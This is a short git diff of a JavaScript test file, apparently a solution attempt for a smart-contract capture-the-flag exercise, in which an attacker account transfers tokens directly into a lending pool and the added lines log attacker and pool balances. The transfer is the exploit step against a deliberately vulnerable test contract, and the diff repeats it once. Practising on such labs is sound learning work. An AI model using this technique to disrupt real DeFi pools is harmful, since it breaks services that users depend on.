@@ -44,6 +44,17 @@ console.log(destroyer, attacker)
         /** CODE YOUR EXPLOIT HERE */
         console.log("exploiting")
         await this.token.connect(attacker).transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
+        console.log("running exploit")
+        const attackBalance = await (this.token.balanceOf(attacker.address))
+        console.log("balance of attacker", attackBalance.toString())
+        const attackTx = await this.token.connect(attacker).transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE)
+        const poolBalance = await this.token.balanceOf(this.pool.address)
+        console.log("Pool Balance",poolBalance.toString())
+        const publicPoolBalance = await this.pool.poolBalance()
+
+        console.log(publicPoolBalance.toString())
+
+
     });
 
     after(async function () {
